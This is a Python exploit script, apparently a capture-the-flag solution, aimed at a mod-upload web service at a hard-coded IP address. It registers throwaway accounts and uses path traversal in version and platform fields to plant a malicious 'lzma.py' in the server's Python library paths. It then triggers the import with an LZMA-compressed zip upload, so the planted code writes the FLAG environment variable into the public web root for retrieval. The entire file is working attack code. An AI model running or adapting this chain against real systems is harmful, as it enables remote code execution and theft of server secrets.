import sys, io, zipfile, requests, time, random
sys.path.insert(0, ".")
import palforge as pf
BASE="http://144.79.188.39:36534"; pf.BASE=BASE
def fresh():
    u="u%d"%random.randint(10000,99999); pw="pass12345"
    requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
    return pf.login(u,pw), u
# plant lzma marker in /usr/local (ver+code), then trigger first LZMA upload
for label,(ver,code) in {"L":("../../../usr/local","lib/python3.11"),"U":("../../..","usr/lib/python3.11")}.items():
    tok,u=fresh()
    mal=f'import os\nopen("/usr/share/nginx/html/lz_{label}","w").write(os.environ.get("FLAG","NOFLAG"))\n'.encode()
    pid=pf.create_platform(tok,code,name="z"); mid=pf.create_mod(tok,ver,title="z"); bid=pf.create_build(tok,mid,pid)
    r=pf.upload_zip(tok,mid,bid,{"lzma.py":mal})
    print("plant",label,"->",r.status_code)
# trigger first LZMA upload
tok,u=fresh()
pid=pf.create_platform(tok,"lt%d"%random.randint(0,9999),name="z"); mid=pf.create_mod(tok,"v%d"%random.randint(0,9999),title="z"); bid=pf.create_build(tok,mid,pid)
bio=io.BytesIO()
with zipfile.ZipFile(bio,"w",zipfile.ZIP_LZMA) as zf: zf.writestr("d.txt", b"x")
bio.seek(0)
t=requests.post(f"{BASE}/api/mods/%d/builds/%d/upload/"%(mid,bid),headers={"Authorization":f"Bearer {tok}"},files={"zip_file":("p.zip",bio,"application/zip")},timeout=20)
print("lzma trigger ->",t.status_code)
time.sleep(1)
for mk in ["lz_L","lz_U"]:
    c=requests.get(f"{BASE}/{mk}",timeout=6)
    print(mk,c.status_code,repr(c.content[:50]))
